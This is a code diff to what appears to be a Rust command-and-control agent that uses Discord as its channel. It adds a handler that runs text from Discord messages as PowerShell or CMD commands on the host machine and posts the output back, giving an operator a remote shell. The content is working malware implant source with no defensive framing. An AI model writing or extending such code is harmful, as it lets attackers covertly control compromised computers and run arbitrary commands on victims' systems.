@@ -1,18 +1,30 @@
 use crate::{
-    commands::{shell::exit, SHELL_TYPE},
+    commands::shell::exit,
     errors::DiscordC2Error,
     event_handler::ephemeral_interaction_create,
     os::process_handler::{ProcessHandler, ShellType},
-    utils::{agent::get_or_create_agent, channels::create_text_channel},
+    utils::agent::get_or_create_agent,
+    discord_utils::channels::create_text_channel,
+    commands::shell::download,
 };
+
 
 use serenity::{
     builder::CreateApplicationCommand,
-    model::{application::{command::{Command, CommandOptionType}, interaction::application_command::{CommandDataOption, CommandDataOptionValue, ApplicationCommandInteraction}}},
+    model::application::{command::{Command, CommandOptionType}, interaction::application_command::{CommandDataOption, CommandDataOptionValue, ApplicationCommandInteraction}},
     client::Context,
+    model::prelude::Message,
+    
 };
+
 use chrono::Utc;
-use crate::commands::shell::download;
+use lazy_static::lazy_static;
+use tokio::sync::Mutex;
+use anyhow::Error;
+
+lazy_static! {
+    static ref SHELL_TYPE: Mutex<Option<ShellType>> = Mutex::new(None);
+}
 
 /// Registers the "session" application command with the provided `CreateApplicationCommand` builder. This command
 /// allows users to open an interactive command session with the agent, using either PowerShell or CMD.
@@ -177,5 +189,45 @@ pub async fn session_handler(ctx: &Context, command: &ApplicationCommandInteract
     // Store shell_type in the global variable
     *SHELL_TYPE.lock().await = Some(shell_type);
     println!("Shell Type in handle_session: {:?}", shell_type);
+    Ok(())
+}
+
+pub async fn command_handler(ctx: &Context, message: &Message) -> Result<(), Error> {
+
+    let shell_type = match SHELL_TYPE.lock().await.clone().take() {
+        Some(shell_type) => shell_type,
+        None => {
+            // The session was closed/stale
+            if !message.author.bot {
+                if let Err(why) = message.channel_id.say(&ctx.http, "Stale or expired session. Closing...").await {
+                    println!("Error sending message: {:?}", why);
+                }
+                exit::run(ctx).await?;
+            }
+            return Ok(());
+        }
+    };
+
+    let shell = ProcessHandler::instance(&shell_type).await?;
+
+    if !message.author.bot {
+        // If the user isn't the bot and wants to exit
+        if message.content == "exit" {
+            shell.exit().await?;
+            let mut shell_type = SHELL_TYPE.lock().await;
+            *shell_type = None;
+
+            if let Err(why) = message.channel_id.say(&ctx.http, "Successfully exited session. Use /exit to close the channel.").await {
+                println!("Error sending message: {:?}", why);
+            }
+
+        } else {
+            let output = shell.run_command(&message.content).await?;
+            if let Err(why) = send_message(ctx, message.channel_id, &output, shell.shell_type).await {
+                println!("{}", why);
+            }
+        }
+    }
+
     Ok(())
 }
